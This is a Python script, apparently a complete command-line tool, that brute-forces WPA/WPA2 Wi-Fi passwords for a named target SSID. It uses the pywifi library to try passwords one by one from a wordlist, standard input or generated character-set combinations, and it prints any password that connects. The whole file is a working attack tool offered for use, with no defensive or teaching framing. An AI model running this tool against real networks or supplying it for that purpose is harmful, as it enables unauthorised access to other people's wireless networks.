#!/usr/bin/env python3
import argparse
import sys
import time
import itertools

PRESETS = {
    "alpha": "abcdefghijklmnopqrstuvwxyz",
    "ALPHA": "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
    "digit": "0123456789",
    "alphanumeric": "abcdefghijklmnopqrstuvwxyz0123456789",
    "ALPHANUMERIC": "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "special": "!@#$%^&*()_+|}>?",
    "all": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+|}>?",
}


def resolve_charset(raw):
    if raw in PRESETS:
        return PRESETS[raw]
    return raw


def generate(charset, min_len, max_len):
    for length in range(min_len, max_len + 1):
        for combo in itertools.product(charset, repeat=length):
            yield ''.join(combo)


def main():
    parser = argparse.ArgumentParser(
        description="Brute-force WPA/WPA2 passwords against a target SSID.")
    parser.add_argument("--ssid", required=True, help="Target SSID")
    parser.add_argument("--interface", default="wlan0",
                        help="Wireless interface (default: wlan0)")
    group = parser.add_mutually_exclusive_group()
    group.add_argument("--wordlist", help="File with passwords (one per line)")
    group.add_argument("--charset", help="Generate passwords from charset "
                                         f"or preset ({', '.join(sorted(PRESETS))})")
    parser.add_argument("--min", type=int, default=8,
                        help="Min password length when using --charset (default: 8)")
    parser.add_argument("--max", type=int, default=8,
                        help="Max password length when using --charset (default: 8)")
    parser.add_argument("--limit", type=int, default=0,
                        help="Stop after N attempts (0 = unlimited)")
    args = parser.parse_args()

    try:
        import pywifi
        from pywifi import const
    except ImportError:
        print("error: pywifi not installed. Run: pip install pywifi", file=sys.stderr)
        sys.exit(1)

    def try_password(iface, ssid, password):
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password

        iface.remove_all_network_profiles()
        tmp = iface.add_network_profile(profile)
        iface.connect(tmp)
        time.sleep(0.5)

        if iface.status() == const.IFACE_CONNECTED:
            iface.disconnect()
            return True
        return False

    wifi = pywifi.PyWiFi()
    try:
        iface = wifi.interfaces()[0]
    except IndexError:
        print("error: no wireless interfaces found", file=sys.stderr)
        sys.exit(1)

    iface_name = iface.name()
    print(f"[*] Using interface: {iface_name}", file=sys.stderr)
    print(f"[*] Target SSID: {args.ssid}", file=sys.stderr)

    iface.disconnect()
    time.sleep(0.5)

    if args.wordlist:
        source = open(args.wordlist)
    elif args.charset:
        charset = resolve_charset(args.charset)
        total = sum(len(charset) ** l for l in range(args.min, args.max + 1))
        print(f"[*] Generated charset ({len(charset)} chars): {charset}", file=sys.stderr)
        print(f"[*] Total combinations to try: {total:,}", file=sys.stderr)
        source = generate(charset, args.min, args.max)
    else:
        source = sys.stdin

    attempts = 0
    found = False

    try:
        for pw in source:
            if isinstance(pw, str):
                pw = pw.rstrip('\n\r')
            if not pw:
                continue

            attempts += 1
            print(f"\r[*] Trying ({attempts}): {pw}", end="", file=sys.stderr)
            sys.stderr.flush()

            if try_password(iface, args.ssid, pw):
                print(f"\n[+] FOUND PASSWORD: {pw}", file=sys.stderr)
                print(pw)
                found = True
                break

            if args.limit and attempts >= args.limit:
                print(f"\n[-] Reached limit of {args.limit} attempts", file=sys.stderr)
                break
    except KeyboardInterrupt:
        print(f"\n[-] Interrupted after {attempts} attempts", file=sys.stderr)
    finally:
        iface.disconnect()
        if args.wordlist:
            source.close()

    if not found:
        print(f"\n[-] Password not found after {attempts} attempts", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
